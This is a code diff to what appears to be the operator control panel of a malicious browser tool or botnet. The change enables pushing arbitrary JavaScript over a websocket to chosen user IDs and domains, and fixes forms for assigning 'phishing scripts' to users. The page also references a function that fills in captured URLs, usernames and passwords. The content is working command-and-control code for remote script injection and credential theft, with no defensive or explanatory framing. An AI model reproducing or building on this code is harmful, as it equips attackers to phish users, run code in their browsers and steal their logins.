@@ -90,11 +90,10 @@ window.addEventListener("hashchange", function() { scrollBy(0, -70) });
 
 function js(){
     var id = document.getElementById("JS_ID").value;
-    var script = document.getElementById("JS_SCRIPT").value;
+    var script = document.getElementById("JS_Script").value;
     var url = document.getElementById("JS_URL").value;
-    alert(url);
-    //var jsonPackage = {id: id, type:"sendJavascript", script:script, domain:url};
-    //ws.send(JSON.stringify(jsonPackage));
+    var jsonPackage = {id: id, type:"sendJavascript", script:script, domain:url};
+    ws.send(JSON.stringify(jsonPackage));
 }
 
 function phish(){
@@ -171,6 +170,7 @@ function makeCard(id, status) {
 }
 
 function blackList(){
+    var URL = document.getElementById('blacklistEntry').value;
     var jsonPackage = {id: 0, type:'list', addString: URL};
     ws.send(JSON.stringify(jsonPackage));
 }
@@ -340,32 +340,35 @@ function fillLogins(id, urlArray, usernameArray, passwordArray){
     <br>
 
     <!-- Adding Blacklisted Site -->
-    <h4>Add Site to Blacklist Here</h4>
-    <input type="text" class="form-control blacklist" placeholder="URL">
-    <button class="btn btn-primary" type="button" onclick="blackList()">Add Site</button>
+    <h4>Add site to blacklist</h4>
+    <br>
+    <form onsubmit="blacklist()">
+        <input type = "text" id="blacklistEntry" placeholder="URL"><br>
+        <input type = "submit" class="btn btn-primary">
+    </form>
 
     <br><br>
 
     <!-- Add Phishing -->
-    <form name="phishingForm" onsubmit "return phish()">
+    <form name="phishingForm" onsubmit="phish()">
         <h4>Add phishing script:</h4>
         <br>
-        <input type = "text" name = "Phishing_ID" placeholder = "User ID"><br>
+        <input type = "text" id = "Phishing_ID" placeholder = "User ID"><br>
         <!-- <input type = "text" name = "Phishing_Script" placeholder = "Script"><br> -->
-        <input type = "text" name = "Phishing_URL" placeholder = "URL"><br>
-        <input type = "submit" name = "Submit_Phishing_Script" class="btn btn-primary">
+        <input type = "text" id = "Phishing_URL" placeholder = "URL"><br>
+        <input type = "submit" id = "Submit_Phishing_Script" class="btn btn-primary">
     </form>
 
     <br>
 
     <!-- Add Javascript -->
-    <form name="jsForm" onsubmit "return js()">
+    <form name="jsForm" onsubmit="js()">
         <h4>Add javascript execution script:</h4>
         <br>
-        <input type = "text" name = "JS_ID" placeholder = "User ID"><br>
-        <input type = "text" name = "JS_Script" placeholder = "Script"><br>
-        <input type = "text" name = "JS_URL" placeholder = "URL"><br>
-        <input type = "submit" name = "Submit_JS_Script" class="btn btn-primary">
+        <input type = "text" id = "JS_ID" placeholder = "User ID"><br>
+        <input type = "text" id = "JS_Script" placeholder = "Script"><br>
+        <input type = "text" id = "JS_URL" placeholder = "URL"><br>
+        <input type = "submit" id = "Submit_JS_Script" class="btn btn-primary">
     </form>
 
 	</div>
